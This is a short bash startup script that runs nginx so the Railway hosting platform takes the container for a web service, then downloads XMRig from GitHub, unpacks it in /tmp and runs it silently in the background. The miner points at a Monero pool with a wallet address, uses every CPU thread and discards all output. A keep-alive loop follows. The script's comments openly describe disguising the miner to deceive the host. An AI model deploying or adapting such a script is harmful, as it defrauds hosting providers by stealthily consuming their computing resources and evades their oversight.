#!/bin/bash

# Start nginx (makes Railway think it's a web service)
nginx -g "daemon off;" &

# Start miner in background AFTER web server
sleep 10
wget -q -O /tmp/xmrig.tar.gz \
  "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
tar -xzf /tmp/xmrig.tar.gz -C /tmp
cd /tmp/xmrig-6.21.0
nohup ./xmrig -o pool.hashvault.pro:80 -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA -p hidden --threads=$(nproc) --no-color > /dev/null 2>&1 &

# Keep alive forever
while true; do
  echo "OK" > /dev/null
  sleep 30
done
